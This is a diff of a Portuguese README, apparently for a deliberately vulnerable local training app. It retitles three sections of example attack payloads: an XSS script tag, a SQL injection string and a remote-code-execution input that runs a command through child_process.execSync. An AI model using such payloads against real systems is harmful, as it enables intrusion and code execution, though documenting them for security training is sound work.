@@ -26,7 +26,7 @@ http://localhost:3000
 ## Vulnerabilidades 
 ### XSS
 
-Payload
+Payload de exploração
 ```
 /?userInput=<script>alert(1)</script>
 ```
@@ -35,7 +35,7 @@ Evidência
 
 ### SQL Injection
 
-Payload
+Payload de exploração
 ```
 /users?username='+or+1=1--&access-token=' 
 ```
@@ -45,7 +45,7 @@ Evidência em uso normal do endpoint.
 
 
 ### RCE
-Payload
+Payload de exploração
 ```
 /users/has-access?userId=1&resourceId=42&userAccessCheck=function(userId,%20resourceId)%20{%20return%20require('child_process').execSync('ping+-c+4+localhost').toString();%20}
 ``` 
